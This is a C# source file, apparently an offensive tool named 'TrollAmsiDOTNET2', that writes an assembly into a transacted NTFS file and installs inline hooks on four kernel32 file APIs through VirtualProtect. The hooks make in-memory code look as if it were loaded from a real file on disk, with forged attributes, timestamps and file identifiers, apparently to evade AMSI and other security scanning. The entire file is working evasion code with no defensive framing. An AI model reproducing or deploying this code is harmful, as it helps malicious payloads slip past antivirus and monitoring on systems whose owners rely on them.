using System;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;


public static class TrollAmsiDOTNET2
{

    [DllImport("Kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("ktmw32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    public extern static IntPtr CreateTransaction(IntPtr lpTransactionAttributes, IntPtr UOW, int CreateOptions, int IsolationLevel, int IsolationFlags, int Timeout, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder Description);

    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFileTransactedW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile, IntPtr hTransaction, ref ushort pusMiniVersion, IntPtr nullValue);

    [DllImport("Kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr delegateCreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate uint delegateGetFileAttributesW(IntPtr lpFileName);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate bool delegateGetFileAttributesExW(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate bool deledateGetFileInformationByHandle(IntPtr hFile, IntPtr lpFileInformation);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)] public delegate bool delegateVirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

    public static IntPtr GetProcAddress(string moduleName, string procedureName)
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
        Assembly systemAssembly = assemblies.FirstOrDefault(a =>
            a.GlobalAssemblyCache &&
            a.Location.EndsWith("System.dll", StringComparison.OrdinalIgnoreCase));
        Type unsafeNativeMethods = systemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
        MethodInfo getModuleHandle = unsafeNativeMethods.GetMethod("GetModuleHandle", new Type[] { typeof(string) });
        MethodInfo getProcAddress = unsafeNativeMethods.GetMethod("GetProcAddress", new Type[] { typeof(HandleRef), typeof(string) });
        object hModule = getModuleHandle.Invoke(null, new object[] { moduleName });
        IntPtr dummyPtr = IntPtr.Zero;
        HandleRef handleRef = new HandleRef(dummyPtr, (IntPtr)hModule);
        object procAddress = getProcAddress.Invoke(null, new object[] { handleRef, procedureName });
        return (IntPtr)procAddress;
    }


    public static IntPtr createFileHandle;
    public static string loadedAssemblyName;
    public static byte[] assemblyBytes;
    public static byte[] attributeData = new byte[36];
    static bool attribDataSet = false;
    static IntPtr transactionHandle = IntPtr.Zero;
    static int assemblyLength;
    static string thepath = "";
    static int Counter = 0;
    struct HookEntry
    {
        public Delegate detour;
        public string api;
        public IntPtr hookAddr, targetAddr;
        public byte[] originalBytes, hookBytes;
        public int oldProtect;
    }

    static HookEntry[] hooks = new HookEntry[4];
    static delegateCreateFileW A;
    static delegateGetFileAttributesW B;
    static delegateGetFileAttributesExW C;
    static deledateGetFileInformationByHandle D;

    public static bool SpoofFileOnDisk(string path, byte[] assemblyBytes)
    {
        try {
        thepath = path;
        IntPtr UOW = IntPtr.Zero;
        IntPtr lpTransactionAttributes = IntPtr.Zero;
        int CreateOptions = 0;
        int IsolationLevel = 0;
        int IsolationFlags = 0;
        int Timeout = 0;
        ushort miniVersion = 0xffff;
        
        //Create a transaction, pass the transaction handle to CreateFileTransacted
        transactionHandle = CreateTransaction(lpTransactionAttributes, UOW, CreateOptions, IsolationLevel, IsolationFlags, Timeout, null);
        createFileHandle = CreateFileTransactedW(path, 0x80000000 | 0x40000000, 0x00000002, IntPtr.Zero, 0x00000004, 0x100 | 0x04000000, IntPtr.Zero, transactionHandle, ref miniVersion, IntPtr.Zero);
        if (createFileHandle.ToInt32() == -1) { throw new ArgumentException("Error - It must be a location you can write to! dont worry you wont be writing :0"); }
        uint bytesWritten = 0;
        assemblyLength = assemblyBytes.Length;
        bool written = WriteFile(createFileHandle, assemblyBytes, (uint)assemblyBytes.Length, out bytesWritten, IntPtr.Zero);

        A = CreateFileWDetour; B = GetFileAttributesWDetour; C = GetFileAttributesExWDetour; D = GetFileInformationByHandleDetour;

        IntPtr VPAddr = GetProcAddress("kernel32.dll", "VirtualProtect");
        A = CreateFileWDetour; B = GetFileAttributesWDetour; C = GetFileAttributesExWDetour; D = GetFileInformationByHandleDetour;
        hooks[0].detour = A; hooks[0].api = "CreateFileW";
        hooks[1].detour = B; hooks[1].api = "GetFileAttributesW";
        hooks[2].detour = C; hooks[2].api = "GetFileAttributesExW";
        hooks[3].detour = D; hooks[3].api = "GetFileInformationByHandle";

        var vp = (delegateVirtualProtect)Marshal.GetDelegateForFunctionPointer(GetProcAddress("kernel32.dll", "VirtualProtect"), typeof(delegateVirtualProtect));

        for (int i = 0; i < hooks.Length; i++)
        {
            hooks[i].hookAddr = Marshal.GetFunctionPointerForDelegate(hooks[i].detour);
            hooks[i].targetAddr = GetProcAddress("kernel32.dll", hooks[i].api);
            hooks[i].originalBytes = new byte[12];
            Marshal.Copy(hooks[i].targetAddr, hooks[i].originalBytes, 0, 12);
            hooks[i].hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hooks[i].hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
            vp(hooks[i].targetAddr, 12, 0x40, out hooks[i].oldProtect);
            Marshal.Copy(hooks[i].hookBytes, 0, hooks[i].targetAddr, hooks[i].hookBytes.Length);
        }
        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
            return false;
        }
        return true;

    }

    static IntPtr CreateFileWDetour(string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile)
    {
        var F = (delegateCreateFileW)Marshal.GetDelegateForFunctionPointer(hooks[0].targetAddr, typeof(delegateCreateFileW));
        try
        {
            Marshal.Copy(hooks[0].originalBytes, 0, hooks[0].targetAddr, 12);
            if (lpFileName.Contains(thepath)) return createFileHandle;
            return F(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
        }
        finally
        {
            Marshal.Copy(hooks[0].hookBytes, 0, hooks[0].targetAddr, 12);
          
        }
    }

    static uint GetFileAttributesWDetour(IntPtr lpFileName)
    {
        var F = (delegateGetFileAttributesW)Marshal.GetDelegateForFunctionPointer(hooks[1].targetAddr, typeof(delegateGetFileAttributesW));
        try
        {
            Marshal.Copy(hooks[1].originalBytes, 0, hooks[1].targetAddr, 12);
            string fileName = Marshal.PtrToStringUni(lpFileName);
            return fileName.Contains(thepath) ? 32 : F(lpFileName);
        }
        finally
        {
            Marshal.Copy(hooks[1].hookBytes, 0, hooks[1].targetAddr, 12);
        }
    }

    static bool GetFileAttributesExWDetour(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation)
    {
        var F = (delegateGetFileAttributesExW)Marshal.GetDelegateForFunctionPointer(hooks[2].targetAddr, typeof(delegateGetFileAttributesExW));
        try
        {
            Marshal.Copy(hooks[2].originalBytes, 0, hooks[2].targetAddr, 12);
            string fileName = Marshal.PtrToStringUni(lpFileName);
            if (fileName.Contains(thepath))
            {
                if (!attribDataSet)
                {
                    var rand = new Random();
                    var creationTime = DateTime.Now.AddSeconds(rand.Next(-604800, 0));
                    BitConverter.GetBytes(0x20).CopyTo(attributeData, 0);
                    BitConverter.GetBytes(creationTime.ToFileTime()).CopyTo(attributeData, 4);
                    var writeTime = creationTime.AddSeconds(rand.Next((int)(DateTime.Now - creationTime).TotalSeconds));
                    BitConverter.GetBytes(writeTime.ToFileTime()).CopyTo(attributeData, 20);
                    var modTime = writeTime.AddSeconds(rand.Next((int)(DateTime.Now - writeTime).TotalSeconds));
                    BitConverter.GetBytes(modTime.ToFileTime()).CopyTo(attributeData, 12);
                    BitConverter.GetBytes(0).CopyTo(attributeData, 28);
                    BitConverter.GetBytes(assemblyLength).CopyTo(attributeData, 32);
                    Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                    attribDataSet = true;
                }
                else Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                return true;
            }
            return F(lpFileName, fInfoLevelId, lpFileInformation);
        }
        finally
        {
            Marshal.Copy(hooks[2].hookBytes, 0, hooks[2].targetAddr, 12);

        }
    }

    static bool GetFileInformationByHandleDetour(IntPtr hFile, IntPtr lpFileInformation)
    {
        var F = (deledateGetFileInformationByHandle)Marshal.GetDelegateForFunctionPointer(hooks[3].targetAddr, typeof(deledateGetFileInformationByHandle));
        try
        {
            Marshal.Copy(hooks[3].originalBytes, 0, hooks[3].targetAddr, 12);
            if (hFile == createFileHandle)
            {
                byte[] data = new byte[52];
                Buffer.BlockCopy(attributeData, 0, data, 0, 28);
                var rand = new Random();
                byte[] serial = new byte[4], fingerprint = new byte[8];
                rand.NextBytes(serial); rand.NextBytes(fingerprint);
                fingerprint[0] = fingerprint[1] = 0;
                Array.Copy(serial, 0, data, 28, 4);
                Buffer.BlockCopy(attributeData, 28, data, 32, 8);
                BitConverter.GetBytes(1).CopyTo(data, 40);
                Array.Copy(fingerprint, 0, data, 44, 8);
                Marshal.Copy(data, 0, lpFileInformation, 52);
                Counter = Counter + 1;
                return true;
            }
            if (Counter > 1)
            {
                CloseHandle(createFileHandle);
                CloseHandle(transactionHandle);
            }
            return F(hFile, lpFileInformation);
        }
        finally
        {
            Marshal.Copy(hooks[3].hookBytes, 0, hooks[3].targetAddr, 12);

        }
    }
}
